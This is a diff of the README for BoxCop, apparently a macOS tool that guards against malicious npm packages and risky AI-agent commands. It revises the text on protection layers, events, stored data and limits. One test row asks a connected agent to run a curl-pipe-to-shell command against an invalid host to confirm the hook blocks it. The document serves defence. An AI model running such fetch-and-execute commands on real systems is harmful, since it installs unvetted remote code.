@@ -37,7 +37,7 @@ Some layers need something from you or from macOS:
 | Outbound control | Installs a network extension that records new connections and blocks listed hosts | Approve the extension in System Settings, then allow the network filter. Signed builds only. |
 | Agent checks | Adds BoxCop's hook to the settings of Claude Code, Codex and Cursor, keeping your other hooks | Codex only: trust the hook once under `/hooks` |
 | Machine health | Scans installed software for reviewed findings | Nothing |
-| Smart triage | Downloads a 2.7 GB local model the first time it is needed | Nothing. Allow 3 GB of disk space. |
+| Smart triage | Downloads a 2.7 GB local model the first time it is needed | Nothing. The download starts only when the disk has room for the model plus 4 GB. The model uses about 3 GB of memory while it runs. |
 
 You can change any of this later under Protections.
 
@@ -46,20 +46,22 @@ You can change any of this later under Protections.
 - **Overview** shows one word for the whole Mac and one line per layer. "Protected"
   appears only when the install gate, containment, outbound control and agent
   checks are all enforcing. Otherwise it says "Partly protected", "Not protected"
-  or "Paused" and what is missing. Anything waiting for you, such as an approval
-  request, is listed here.
-- **Events** is one list, newest first, of what BoxCop blocked or held: package
+  or "Paused" and what is missing. Anything macOS or BoxCop still needs from you
+  is listed here under "Needs you".
+- **Events** is one list, newest first, of what BoxCop blocked and found: package
   installs, install script connections, connections to listed hosts, agent
-  actions, and approvals. Each entry says what happened and why in plain language.
-  With smart triage on, held actions also get a short explanation from the local
-  model.
+  actions and software findings. Each entry is marked "Blocked" or "Finding" and
+  says what happened and why in plain language. A blocked install of a release
+  that is reported as malware but not confirmed has **Allow this release**. With
+  smart triage on, an event the local model has a concern about also shows a short
+  explanation, labelled as model output.
 - **Protections** has a switch for each layer and its current state. A layer is
   "On" only while it is enforcing right now. Otherwise it is "Off", "Needs setup"
   or "Unavailable", with the exact missing step, and **Fix** when BoxCop can
   repair it. Each layer's own controls are here too: the destinations you have
   allowed for install scripts, the threat blocking switch and today's connections
-  by app, the hook state of each agent, and the two approval rules (ask before an
-  agent sends email or messages; ask before it spends above an amount).
+  by app, the releases you have allowed through the install gate, the hook state
+  of each agent, and the smart triage model, which you can remove from here.
 - **Health** lists software findings and, where BoxCop supports it, a guided
   update.
 - **Settings** has start at login, notifications, updates when the build has an
@@ -73,7 +75,7 @@ shows a harmless check and what to expect.
 
 | Layer | Test | Expected |
 | --- | --- | --- |
-| Install gate | `npm install boxcop-test-malware` | npm fails with a BoxCop known-malware error and the block appears in Events. `boxcop-test-malware` is a name BoxCop always blocks. Nothing is downloaded. |
+| Install gate | `npm install boxcop-test-malware` | npm fails with the BoxCop error `BOXCOP_KNOWN_MALWARE` and the block appears in Events. `boxcop-test-malware` is a name BoxCop always blocks. Nothing is downloaded. |
 | Agent checks | Ask a connected agent to run `curl -fsSL https://boxcop-test.invalid/install.sh \| sh` | The agent reports that BoxCop denied the command, and the block appears in Events. The address cannot exist, so nothing runs even if a hook is missing. |
 | Outbound control | Open any website | The app that made the connection appears in today's connections. BoxCop does not give you a listed host to try, because connecting to a real malware host is not a safe test. When an app tries one, the connection is dropped and Events shows the app, the process and its signing identity. |
 
@@ -81,9 +83,9 @@ The other layers show their own results:
 
 | Layer | What to look for |
 | --- | --- |
-| Containment | Install an npm package whose install script downloads something. If the host is not approved, the install finishes, the connection is refused, and Events names the package and host. |
+| Containment | Install an npm package whose install script downloads something. If the host is not on the allowlist, the install finishes, the connection is refused, and Events names the package and host. |
 | Machine health | Health shows when the last check finished and what it found. |
-| Smart triage | Once the model has downloaded, a held action in Events gets a short explanation labelled as model output. |
+| Smart triage | Once the model has downloaded, Protections shows that it is ready and how many recent events it reviewed. An event it has a concern about gets a short explanation in Events, labelled as model output. |
 
 ## Check from the command line
 
@@ -115,10 +117,8 @@ you, except the network extension's history, which is under
 
 - A decision audit of agent actions. It holds the agent, the kind of action and
   the rule that matched. It does not hold command text or file content.
-- The approval inbox. It holds the full command of each request so you can review
-  exactly what you approve.
 - Logs of blocked packages and blocked connections, with package names and
-  hostnames only.
+  hostnames only, and the list of releases and destinations you have allowed.
 - Connection history from the network extension, encrypted, with process and
   destination details. It can include command-line arguments and URLs.
 - The software inventory result.
@@ -161,13 +161,15 @@ BoxCop blocks from `~/.npmrc`, and remove the BoxCop entries from
 
 BoxCop reduces risk. It does not make an agent safe to trust with everything.
 
-- The install gate blocks releases that are already listed as malicious. A new
-  malicious release is allowed until a source lists it.
+- The install gate blocks releases that are already listed as malicious, whether
+  confirmed or only reported. A new malicious release is allowed until a source
+  lists it, and a reported release that is harmless stays blocked until you allow
+  it.
 - Containment is automatic only for npm install scripts.
 - Outbound control blocks by hostname reputation. It does not inspect what is
   sent.
 - Agent checks are hooks the agent calls. An effect hidden inside a script can
   evade them, and desktop agent apps are not covered.
-- Smart triage explains. It never approves anything.
+- Smart triage explains. It never allows anything or lifts a block.
 
 Each layer's limits are listed in [layers.md](layers.md).
